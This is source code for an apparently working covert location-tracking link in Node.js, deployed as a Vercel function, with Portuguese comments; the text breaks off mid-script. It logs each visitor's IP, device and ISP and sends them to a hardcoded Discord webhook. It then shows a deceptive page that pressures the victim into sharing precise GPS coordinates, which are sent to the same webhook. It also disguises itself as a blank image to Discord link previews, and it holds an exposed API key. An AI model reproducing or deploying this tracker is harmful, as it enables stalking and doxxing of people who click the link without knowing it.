// Location Logger - Versão corrigida para Vercel
const https = require('https');
const http = require('http');
const url = require('url');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
  "username": "Location Tracker",
  "color": 0xFF3E4D,
  "accurateLocation": true
};

// Função para obter informações detalhadas sobre o IP
async function getIPInfo(ip) {
  return new Promise((resolve, reject) => {
    // Usar API alternativa que funciona melhor com IPv6 e redes móveis
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    
    http.get(apiUrl, (res) => {
      let data = '';
      res.on('data', (chunk) => { 
        data += chunk; 
      });
      
      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          console.log('Resposta da API IP:', parsedData);
          
          // Verificar se a API retornou sucesso
          if (parsedData.status === 'success') {
            resolve(parsedData);
          } else {
            console.error('API retornou status diferente de sucesso:', parsedData);
            // Ainda resolvemos com os dados que temos
            resolve(parsedData);
          }
        } catch (e) {
          console.error('Erro ao analisar resposta da API IP:', e);
          console.error('Dados recebidos:', data);
          // Resolvemos com um objeto vazio para evitar erros na formatação
          resolve({});
        }
      });
    }).on('error', (error) => {
      console.error('Erro ao fazer requisição para API de IP:', error);
      // Resolvemos com um objeto vazio para evitar erros na formatação
      resolve({});
    });
  });
}

// Função para enviar webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Preparar os dados
      const webhookData = JSON.stringify(data);
      
      // Parsear a URL do webhook para obter hostname e path
      const webhookUrl = new URL(config.webhook);
      
      // Configurar a requisição
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      console.log('Enviando para webhook:', options.hostname, options.path);
      
      // Criar a requisição
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Coletar dados da resposta
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // Quando a resposta terminar
        res.on('end', () => {
          // Verificar código de status
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook enviado com sucesso');
            resolve(true);
          } else {
            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
            console.error(`Resposta: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Tratar erros na requisição
      req.on('error', (error) => {
        console.error('Erro na requisição do webhook:', error);
        resolve(false); // Mudado de reject para resolve para evitar crash
      });
      
      // Enviar os dados
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Erro ao enviar webhook:', error);
      resolve(false); // Mudado de reject para resolve para evitar crash
    }
  });
}

// Detectar se é um dispositivo iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Função para formatar a mensagem para o Discord
function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
  // Detectar sistema operacional e navegador
  let os = "Unknown";
  let browser = "Unknown";
  
  if (userAgent) {
    // Sistema operacional
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    // Navegador
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      browser = "Opera";
    }
  }

  // Formatar coordenadas
  let coordsText = 'Unknown';
  let coordsSource = 'Approximate';
  let mapsLink = '';
  
  if (coords) {
    coordsText = coords.replace(',', ', ');
    coordsSource = `Precise`;
    mapsLink = `https://www.google.com/maps/search/google+map++${coords}`;
  } else if (info && info.lat && info.lon) {
    coordsText = `${info.lat}, ${info.lon}`;
    coordsSource = `Approximate`;
    mapsLink = `https://www.google.com/maps/search/google+map++${info.lat},${info.lon}`;
  }

  // Formatar timezone
  let timezoneText = 'Unknown';
  if (info && info.timezone) {
    const parts = info.timezone.split('/');
    if (parts.length >= 2) {
      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
    } else {
      timezoneText = info.timezone;
    }
  }

  // Verificar bot
  let botStatus = 'False';
  if (info && info.hosting) {
    botStatus = 'Possibly';
  }
  if (info && info.proxy) {
    botStatus = 'Likely';
  }

  // Extrair ASN do campo "as"
  let asn = 'Unknown';
  if (info && info.as) {
    asn = info.as;
  }

  let content = coords ? "@everyone **LOCALIZAÇÃO EXATA CAPTURADA**" : "";

  return {
    username: config.username,
    content: content,
    embeds: [
      {
        title: `${coords ? "🎯 LOCALIZAÇÃO PRECISA CAPTURADA!" : "🔍 Acesso Detectado - Aguardando GPS"}`,
        color: config.color,
        description: `**Informações do Dispositivo**
> **IP:** \`${ip || 'Unknown'}\`
> **Sistema:** \`${os}\`
> **Navegador:** \`${browser}\`

**Localização:**
> **Coordenadas:** \`${coordsText}\` (${coordsSource})
> **Mapa:** ${mapsLink ? `[Ver no Google Maps](${mapsLink})` : 'Não disponível'}
> **País:** \`${info && info.country ? info.country : 'Unknown'}\`
> **Região:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
> **Cidade:** \`${info && info.city ? info.city : 'Unknown'}\`
> **Operadora:** \`${info && info.isp ? info.isp : 'Unknown'}\`
> **ASN:** \`${asn}\`
> **Timezone:** \`${timezoneText}\`

**Status de Segurança:**
> **Rede Móvel:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
> **VPN/Proxy:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
> **Bot/DC:** \`${botStatus}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\`

**Endpoint:** \`${endpoint || 'N/A'}\``
      }
    ]
  };
}

// Função principal
module.exports = async (req, res) => {
  try {
    // Obter parâmetros da URL
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Verificar se já temos coordenadas de localização
    
    // Obter IP e User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log('Requisição recebida de IP:', ip);
    console.log('User Agent:', userAgent);
    
    // Verificar se é iOS para tratamento especial
    const deviceIsIOS = isIOS(userAgent);
    
    // Verificar se o IP é do Discord (começa com 35)
    const isDiscord = typeof ip === 'string' && ip.startsWith('35');
    
    // Se temos parâmetro de geolocalização, enviar para o Discord
    if (geoParam) {
      try {
        // Decodificar as coordenadas
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        console.log('Coordenadas recebidas:', latitude, longitude);
        
        // Obter informações detalhadas do IP
        console.log('Obtendo informações do IP...');
        const ipInfo = await getIPInfo(ip);
        console.log('Informações do IP obtidas:', ipInfo);
        
        // Formatar a mensagem completa
        const data = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
        
        console.log('Enviando webhook para o Discord...');
        await sendDiscordWebhook(data);
        
        // Enviar página com o Google Maps
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Location Map</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: Arial, sans-serif;
                background-color: #f5f5f5;
              }
              .container {
                display: flex;
                flex-direction: column;
                height: 100vh;
                padding: 20px;
                box-sizing: border-box;
              }
              .map-container {
                flex: 1;
                border-radius: 8px;
                overflow: hidden;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 20px;
              }
              iframe {
                width: 100%;
                height: 100%;
                border: none;
              }
              .info {
                background: white;
                padding: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
              }
              h1 {
                margin-top: 0;
                font-size: 1.5rem;
                color: #333;
              }
              p {
                color: #666;
                line-height: 1.5;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="map-container">
                <iframe
                  src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${latitude},${longitude}&zoom=15"
                  allowfullscreen>
                </iframe>
              </div>
              <div class="info">
                <h1>Localização encontrada</h1>
                <p>Suas coordenadas foram detectadas com sucesso. Esta é a sua localização aproximada no mapa.</p>
                <p>Latitude: ${latitude}, Longitude: ${longitude}</p>
              </div>
            </div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Erro ao processar geolocalização:', error);
        // Continuar mesmo com erro na geolocalização
        sendErrorPage(res);
      }
    } else if (isDiscord) {
      // Se for o Discord acessando, enviar alerta de link
      console.log("Acesso do Discord detectado. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "🔗 Link Enviado no Discord",
            color: config.color,
            description: `Um link de rastreamento foi enviado em um chat!\nVocê pode receber dados de localização em breve.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // Para o Discord, enviar imagem 1x1 transparente
      res.setHeader('Content-Type', 'image/gif');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // Se não temos geolocalização ainda, solicitar do navegador
      
      // Primeiro, obter informações do IP e enviar relatório básico
      console.log('Obtendo informações básicas do IP...');
      const ipInfo = await getIPInfo(ip);
      console.log('Informações básicas do IP obtidas:', ipInfo);
      
      // Formatar a mensagem básica
      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      console.log('Enviando relatório inicial para o Discord...');
      await sendDiscordWebhook(data);
      
      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Carregando...</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              font-family: Arial, sans-serif;
              background-color: #f8f8f8;
              overflow: hidden;
            }
            #overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(0,0,0,0.8);
              z-index: 999;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              padding: 20px;
              box-sizing: border-box;
              color: white;
              text-align: center;
            }
            .modal {
              background-color: #fff;
              border-radius: 12px;
              padding: 30px;
              max-width: 450px;
              width: 90%;
              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
              text-align: center;
              color: #333;
            }
            .title {
              font-size: 22px;
              font-weight: bold;
              margin-bottom: 20px;
              color: #e53935;
            }
            .message {
              font-size: 16px;
              line-height: 1.6;
              margin-bottom: 25px;
            }
            .button {
              background-color: #e53935;
              color: white;
              border: none;
              border-radius: 30px;
              padding: 15px 30px;
              font-size: 16px;
              font-weight: bold;
              cursor: pointer;
              transition: all 0.2s;
              display: inline-block;
            }
            .button:hover {
              background-color: #c62828;
              transform: scale(1.05);
            }
            .icon {
              width: 80px;
              height: 80px;
              margin-bottom: 20px;
              animation: pulse 2s infinite;
            }
            @keyframes pulse {
              0% { transform: scale(1); }
              50% { transform: scale(1.1); }
              100% { transform: scale(1); }
            }
            .loading {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(255,255,255,0.95);
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              z-index: 1000;
            }
            .spinner {
              border: 5px solid rgba(0,0,0,0.1);
              border-radius: 50%;
              border-top: 5px solid #e53935;
              width: 60px;
              height: 60px;
              margin-bottom: 20px;
              animation: spin 1s linear infinite;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            .retry-container {
              display: none;
              text-align: center;
              background-color: #fff;
              padding: 30px;
              border-radius: 12px;
              max-width: 450px;
              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            }
            .error-icon {
              color: #e53935;
              font-size: 50px;
              margin-bottom: 20px;
            }
            .error-title {
              font-size: 22px;
              color: #e53935;
              margin-bottom: 15px;
            }
          </style>
        </head>
        <body>
          <!-- Página de fundo (nunca visível) -->
          <div style="display: none;">Carregando...</div>
          
          <!-- Overlay principal -->
          <div id="overlay">
            <div class="modal">
              <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#e53935">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
              </svg>
              <div class="title">ATENÇÃO</div>
              <div class="message">
                É necessário ativar sua localização para continuar. 
                Este serviço requer acesso à sua posição atual.
              </div>
              <button id="allowLocationBtn" class="button">Permitir Localização</button>
            </div>
          </div>
          
          <!-- Tela de carregamento (inicialmente oculta) -->
          <div id="loadingScreen" class="loading" style="display: none;">
            <div class="spinner"></div>
            <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Obtendo Localização</div>
            <div style="color: #666;">Por favor, aguarde...</div>
          </div>
          
          <!-- Tela de erro/retry (inicialmente oculta) -->
          <div id="retryScreen" class="loading" style="display: none;">
            <div class="retry-container">
              <div class="error-icon">⚠️</div>
              <div class="error-title">Acesso Negado</div>
              <div style="margin-bottom: 20px; color: #666; line-height: 1.5;">
                O acesso à sua localização foi negado. Para continuar, é necessário permitir o acesso à sua localização.
              </div>
              <button onclick="showPermissionInstructions()" class="button" style="background-color: #4285F4; margin-right: 10px;">Como Permitir</button>
              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
            </div>
          </div>
          
          <!-- Tela de instruções (inicialmente oculta) -->
          <div id="instructionsScreen" class="loading" style="display: none;">
            <div class="retry-container" style="max-width: 500px;">
              <div style="text-align: right; margin-bottom: 10px;">
                <button onclick="hideInstructions()" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
              </div>
              <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Como Permitir Acesso à Localização</div>
              
              <div id="chromeInstructions" style="text-align: left; display: none;">
                <p><strong>No Chrome:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado/informação na barra de endereço</li>
                  <li>Clique em "Permissões do site"</li>
                  <li>Encontre "Localização" e selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="safariInstructions" style="text-align: left; display: none;">
                <p><strong>No Safari:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Abra Ajustes no seu iPhone/iPad</li>
                  <li>Role para baixo e toque em "Safari"</li>
                  <li>Toque em "Permissões de Sites"</li>
                  <li>Toque em "Localização" e selecione "Permitir"</li>
                  <li>Volte ao Safari e recarregue a página</li>
                </ol>
              </div>
              
              <div id="firefoxInstructions" style="text-align: left; display: none;">
                <p><strong>No Firefox:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado na barra de endereço</li>
                  <li>Clique em "Permissões"</li>
                  <li>Em "Acessar Sua Localização", selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="edgeInstructions" style="text-align: left; display: none;">
                <p><strong>No Edge:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado na barra de endereço</li>
                  <li>Clique em "Permissões do site"</li>
                  <li>Em "Localização", selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="genericInstructions" style="text-align: left; display: none;">
                <p><strong>Instruções Gerais:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Procure pelo ícone de cadeado ou permissões na barra de endereço</li>
                  <li>Procure por configurações de "Localização" ou "Permissões do site"</li>
                  <li>Altere a configuração para "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
            </div>
          </div>

          <script>
            // Solicitar localização automaticamente quando a página carrega
            document.addEventListener('DOMContentLoaded', function() {
              // Forçamos solicitação após um pequeno delay para garantir que a interface carregue primeiro
              setTimeout(function() {
                // Tentar obter localização automaticamente após 1 segundo
                requestLocation();
              }, 500);
            });

            // Referências aos elementos da interface
            const overlay = document.getElementById('overlay');
            const loadingScreen = document.getElementById('loadingScreen');
            const retryScreen = document.getElementById('retryScreen');
            const instructionsScreen = document.getElementById('instructionsScreen');
            const allowLocationBtn = document.getElementById('allowLocationBtn');

            // Botão para permitir localização
            allowLocationBtn.addEventListener('click', function() {
              requestLocation();
            });

            // Função para solicitar localização
            function requestLocation() {
              // Esconde overlay e mostra tela de carregamento
              overlay.style.display = 'none';
              loadingScreen.style.display = 'flex';
              
              if (navigator.geolocation) {
                // Tenta obter localização com alta precisão e sem cache
                navigator.geolocation.getCurrentPosition(
                  // Sucesso
                  function(position) {
                    // Temos a posição
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const coords = lat + "," + lng;
                    
                    // Codifica em base64
                    const encodedCoords = btoa(coords);
                    
                    // Constrói nova URL
                    const currentUrl = window.location.href;
                    let newUrl;
                    if (currentUrl.includes("?")) {
                      newUrl = currentUrl + "&g=" + encodedCoords;
                    } else {
                      newUrl = currentUrl + "?g=" + encodedCoords;
                    }
                    
                    // Redireciona
                    window.location.replace(newUrl);
                  },
                  // Erro
                  function(error) {
                    console.error("Erro de geolocalização:", error.message);
                    loadingScreen.style.display = 'none';
                    retryScreen.style.display = 'flex';
                  },
                  // Opções
                  {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                  }
                );
              } else {
                alert("Seu navegador não suporta geolocalização. Por favor, use um navegador mais recente.");
                loadingScreen.style.display = 'none';
                overlay.style.display = 'flex';
              }
            }

            // Função para tentar novamente
            function retryLocation() {
              retryScreen.style.display = 'none';
              instructionsScreen.style.display = 'none';
              requestLocation();
            }

            // Função para mostrar instruções de permissão
            function showPermissionInstructions() {
              retryScreen.style.display = 'none';
              instructionsScreen.style.display = 'flex';
              
              // Determina qual navegador está sendo usado
              const ua = navigator.userAgent;
              const chromeInst = document.getElementById('chromeInstructions');
              const safariInst = document.getElementById('safariInstructions');
              const firefoxInst = document.getElementById('firefoxInstructions');
              const edgeInst = document.getElementById('edgeInstructions');
              const genericInst = document.getElementById('genericInstructions');
              
              // Esconde todas as instruções primeiro
              chromeInst.style.display = 'none';
              safariInst.style.display = 'none';
              firefoxInst.style.display = 'none';
              edgeInst.style.display = 'none';
              genericInst.style.display = 'none';
              
              // Mo
